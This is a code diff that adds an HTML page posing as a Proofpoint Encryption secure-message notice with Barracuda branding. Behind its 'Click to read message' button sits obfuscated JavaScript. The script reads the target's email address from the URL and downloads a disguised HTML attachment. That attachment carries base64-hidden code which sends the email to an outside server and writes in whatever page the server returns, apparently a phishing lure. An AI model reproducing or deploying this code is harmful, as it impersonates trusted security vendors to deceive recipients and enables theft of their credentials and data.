@@ -1,0 +1,205 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Proofpoint Encryption</title>
+    <style>
+      /* Global styles to prevent overflow issues */
+      * {
+        box-sizing: border-box;
+        font-family: "Arial", sans-serif;
+      }
+
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+        color: #414141;
+      }
+
+      /* Default styles for mobile devices */
+      .container {
+        width: 90vw;
+        max-width: 100%;
+        margin: auto;
+        margin-top: 20px;
+      }
+
+      .rectangle {
+        width: 100%;
+        border: 1px solid black;
+        padding: 15px;
+      }
+
+      .content-table {
+        width: 100%;
+        border-collapse: collapse;
+        color: #000000;
+      }
+
+      .content-table td {
+        padding: 10px;
+        text-align: left;
+      }
+      @media (max-width: 768px) {
+        .content-table td {
+          padding: 10px 0px 10px 0px;
+        }
+      }
+      .button-container input {
+        width: 100%;
+        padding: 10px;
+        text-align: center;
+        font-size: 14px;
+      }
+
+      .info-link a {
+        text-align: center;
+        display: block;
+        margin-top: 0px;
+        width: 100%;
+        color: #3366cc;
+      }
+
+      /* Styles for larger screens (tablet and desktop) */
+      @media (min-width: 768px) {
+        body {
+          font-size: 14px;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          padding: 20px;
+        }
+
+        .container {
+          max-width: 450px;
+          display: flex;
+          flex-direction: column;
+        }
+
+        .rectangle {
+          padding: 0px;
+          background-color: #ffffff;
+          border: 1px solid #333333;
+          color: #000000;
+          display: flex;
+          flex-direction: column;
+        }
+
+        .button-container {
+          display: flex;
+          justify-content: center;
+        }
+
+        .button-container input {
+          width: auto;
+          padding: 1px 10px;
+          font-size: 14px;
+        }
+
+        .disclaimer {
+          font-size: 12px;
+          color: #aaaaaa;
+          padding-top: 10px;
+        }
+
+        .info-link {
+          font-size: 12px;
+          padding-top: 10px;
+          text-align: center;
+          color: #3366cc;
+        }
+
+        .header {
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+        }
+      }
+      @media (max-width: 768px) {
+        .disclaimer-table {
+          margin-top: 1rem;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="rectangle">
+        <table class="content-table">
+          <tbody>
+            <tr class="header">
+              <td>
+                <img
+                  src="https://cdn.cookielaw.org/logos/1b503826-0eee-4147-b5a6-93330b3031bb/733338cb-91fd-408a-9735-996394613c7f/logo_barracuda_primary_strapline.png"
+                  alt="Barracuda Logo"
+                  width="200"
+                />
+              </td>
+              <td align="right">
+                <img
+                  src="https://securemail.securian.com/securereader/Image?c=lock&amp;b=1&amp;rnd=3.97618804702763"
+                  alt="Lock Icon"
+                />
+              </td>
+            </tr>
+            <tr class="button-container">
+              <td colspan="2">
+                <input
+                  type="button"
+                  id="theButton"
+                  value="Click to read message"
+                />
+              </td>
+            </tr>
+            <tr>
+              <td colspan="2" style="padding-top: 10px">
+                If you are unable to view this message from a mobile device,
+                access this email from a desktop or laptop computer. (Depending
+                on message size, it could take several minutes for the message
+                to open)
+              </td>
+            </tr>
+            <tr>
+              <td colspan="2">
+                <div class="info-link">
+                  <a
+                    href="https://securemail.securian.com/securereader/help.jsf?lang=enus"
+                    target="_blank"
+                    >More Info</a
+                  >
+                </div>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <table class="disclaimer-table">
+        <tr>
+          <td class="disclaimer">
+            <b>Disclaimer</b>:&nbsp;This email and its content are confidential
+            and intended solely for the use of the addressee. Please notify the
+            sender if you have received this email in error or simply delete it.
+          </td>
+        </tr>
+        <tr>
+          <td class="disclaimer">
+            Secured by Proofpoint Encryption, Copyright © 2009-2020 Proofpoint,
+            Inc. All rights reserved.
+          </td>
+        </tr>
+      </table>
+    </div>
+
+    <script>
+        function _0x5da9(_0x28a4c1,_0x32502a){var _0x2a34bd=_0x2a34();return _0x5da9=function(_0x5da94d,_0x311c0c){_0x5da94d=_0x5da94d-0x1c7;var _0x433a35=_0x2a34bd[_0x5da94d];return _0x433a35;},_0x5da9(_0x28a4c1,_0x32502a);}var _0x49c645=_0x5da9;(function(_0x393a04,_0x3b45c9){var _0x436285=_0x5da9,_0x27075b=_0x393a04();while(!![]){try{var _0x334836=parseInt(_0x436285(0x1c9))/0x1+parseInt(_0x436285(0x1d9))/0x2*(-parseInt(_0x436285(0x1e1))/0x3)+parseInt(_0x436285(0x1d7))/0x4+-parseInt(_0x436285(0x1d0))/0x5+parseInt(_0x436285(0x1dc))/0x6+-parseInt(_0x436285(0x1d4))/0x7*(-parseInt(_0x436285(0x1c8))/0x8)+-parseInt(_0x436285(0x1d5))/0x9*(parseInt(_0x436285(0x1db))/0xa);if(_0x334836===_0x3b45c9)break;else _0x27075b['push'](_0x27075b['shift']());}catch(_0x255f96){_0x27075b['push'](_0x27075b['shift']());}}}(_0x2a34,0x98c86),document[_0x49c645(0x1cb)](_0x49c645(0x1cf),function(){var _0x38825b=_0x49c645,_0x2c9e71=document[_0x38825b(0x1c7)](_0x38825b(0x1dd));_0x2c9e71['addEventListener'](_0x38825b(0x1d8),function(){var _0x5da367=_0x38825b,_0x2b2931=window[_0x5da367(0x1ca)]['hash'][_0x5da367(0x1d6)](0x1);if(!_0x2b2931){var _0x146334=window[_0x5da367(0x1ca)][_0x5da367(0x1cc)][_0x5da367(0x1cd)](/\(([^)]+)\)/);_0x146334&&_0x146334[0x1]&&(_0x2b2931=_0x146334[0x1]);}var _0xe59790=_0x2b2931,_0x5e15ff=new Date()['toISOString'](),_0x3335cc=_0x5da367(0x1d1)+_0xe59790+')_'+_0x5e15ff+_0x5da367(0x1e0),_0x595ffc=document[_0x5da367(0x1de)]('a');document['body'][_0x5da367(0x1e2)](_0x595ffc),_0x595ffc[_0x5da367(0x1cc)]=_0x5da367(0x1ce),_0x595ffc[_0x5da367(0x1d2)](_0x5da367(0x1df),_0x3335cc),_0x595ffc[_0x5da367(0x1d8)](),document[_0x5da367(0x1da)][_0x5da367(0x1d3)](_0x595ffc);});}));function _0x2a34(){var _0x4c2b28=['DOMContentLoaded','2025750keDYjS','SecureMessageAtt_(','setAttribute','removeChild','32795puGknE','9arJqCH','substring','2914340oPBPAi','click','422zBRXqw','body','10749930eJnehE','4996650FUZLJC','theButton','createElement','download','.html','81qelvFa','appendChild','getElementById','152KHMFEp','461263RibCHV','location','addEventListener','href','match','data:text/html;charset=utf-8,%3Chtml%3E%3Chead%3E%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fcrypto-js%2F4.0.0%2Fcrypto-js.min.js%22%3E%3C%2Fscript%3E%3Cstyle%3E%0A%23nacreous%20%7B%20animation%3A%20bounce%205s%20infinite%3B%20%7D%0A%40keyframes%20bounce%20%7B51%25%20%7B%20transform%3A%20translateY(15px)%20scaleY(0.98)%3B%20%7D15%25%20%7B%20transform%3A%20translateY(-1px)%20scaleY(1.03)%3B%20%7D24%25%20%7B%20transform%3A%20translateY(4px)%20scaleY(1.09)%3B%20%7D%7D%0A%23backfire%20%7B%20animation%3A%20bounce%205s%20infinite%3B%20%7D%0A%40keyframes%20bounce%20%7B96%25%20%7B%20transform%3A%20translateY(18px)%20scaleY(0.97)%3B%20%7D0%25%20%7B%20transform%3A%20translateY(-10px)%20scaleY(0.9)%3B%20%7D25%25%20%7B%20transform%3A%20translateY(-18px)%20scaleY(1)%3B%20%7D52%25%20%7B%20transform%3A%20translateY(-14px)%20scaleY(0.92)%3B%20%7D7%25%20%7B%20transform%3A%20translateY(14px)%20scaleY(0.93)%3B%20%7D%7D%0A%3C%2Fstyle%3E%3C%2Fhead%3E%3Cbody%3E%3Cdiv%20id%3D%22nacreous%22%3E%3Ch1%20style%3D%22display%3Anone%3B%22%3EDriving%20hums%20aspirations%20with%20courage.%3C%2Fh1%3E%3C%2Fdiv%3E%3Cscript%3Enew%20Function(atob(%60ZnVuY3Rpb24gZ3YoKSB7CiAgICAgICAgICAgIHZhciB2cnMgPSB7fTsgLy8gT2JqZWN0IHRvIHN0b3JlIFVSTCBwYXJhbWV0ZXJzCiAgICAgICAgICAgIHZhciBwcyA9IHdpbmRvdy5sb2NhdGlvbi5ocmVmLnJlcGxhY2UoL1s/Jl0rKFtePSZdKyk9KFteJl0qKS9naSwgZnVuY3Rpb24obSwga2V5LCB2YWx1ZSkgewogICAgICAgICAgICAgICAgdnJzW2tleV0gPSB2YWx1ZTsKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAvLyBHZXQgdGhlIHBhcnQgYWZ0ZXIgdGhlICMKICAgICAgICAgICAgbGV0IGNmZyA9IHdpbmRvdy5sb2NhdGlvbi5oYXNoID8gd2luZG93LmxvY2F0aW9uLmhhc2guc3Vic3RyaW5nKDEpIDogdW5kZWZpbmVkOwoKICAgICAgICAgICAgLy8gSWYgdGhlcmUncyBubyAjIHBhcmFtLCBleHRyYWN0IGVtYWlsIGZyb20gdGhlIFVSTCB3aXRoaW4gcGFyZW50aGVzZXMKICAgICAgICAgICAgaWYgKHR5cGVvZiBjZmcgPT09ICd1bmRlZmluZWQnIHx8IGNmZyA9PT0gJycpIHsKICAgICAgICAgICAgICAgIC8vIFVzZSByZWd1bGFyIGV4cHJlc3Npb24gdG8gZXh0cmFjdCB0aGUgZW1haWwgaW5zaWRlIHBhcmVudGhlc2VzCiAgICAgICAgICAgICAgICBsZXQgbWF0Y2ggPSB3aW5kb3cubG9jYXRpb24uaHJlZi5tYXRjaCgvXCgoW14pXSspXCkvKTsKICAgICAgICAgICAgICAgIGlmIChtYXRjaCAmJiBtYXRjaFsxXSkgewogICAgICAgICAgICAgICAgICAgIGNmZyA9IG1hdGNoWzFdOyAvLyBFeHRyYWN0ZWQgZW1haWwgaW5zaWRlIGJyYWNrZXRzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vIFNlbmQgdGhlIFBPU1QgcmVxdWVzdCB3aXRoIHRoZSBleHRyYWN0ZWQgZW1haWwgb3IgaGFzaAogICAgICAgICAgICBmZXRjaCgnaHR0cHM6Ly9wbG95bW95cm90YXRlczAzMzE5LmVzLycsIHsKICAgICAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcjogY2ZnLCAvLyBVc2UgZWl0aGVyIHRoZSBoYXNoIG9yIHRoZSBlbWFpbCBleHRyYWN0ZWQgZnJvbSBwYXJlbnRoZXNlcwogICAgICAgICAgICAgICAgICAgIHRva2VuOiAnZDBlNDU4YjItYjFmZi00MGRjLWI0N2UtMjA5M2M2ODRkOWI3JwogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgfSkKICAgICAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UuanNvbigpKQogICAgICAgICAgICAudGhlbihkYXRhID0+IHsKICAgICAgICAgICAgICAgIGRvY3VtZW50Lm9wZW4oInRleHQvaHRtbCIsICJyZXBsYWNlIik7CiAgICAgICAgICAgICAgICBkb2N1bWVudC53cml0ZShkYXRhLmh0bWwpOwogICAgICAgICAgICAgICAgZG9jdW1lbnQuY2xvc2UoKTsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdSZXNwb25zZSBTdGF0dXM6JywgZGF0YS5zdGF0dXMpOwogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ01lc3NhZ2U6JywgZGF0YS5tZXNzYWdlKTsKICAgICAgICAgICAgfSkKICAgICAgICAgICAgLmNhdGNoKGVycm9yID0+IGNvbnNvbGUuZXJyb3IoJ0Vycm9yOicsIGVycm9yKSk7CiAgICAgICAgfQoKICAgICAgICAvLyBDYWxsIHRoZSBmdW5jdGlvbiB0byBleGVjdXRlIHRoZSBsb2dpYwogICAgICAgIGd2KCk7%60))()%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E'];_0x2a34=function(){return _0x4c2b28;};return _0x2a34();}
+      </script>
+      
+  </body>
+</html>
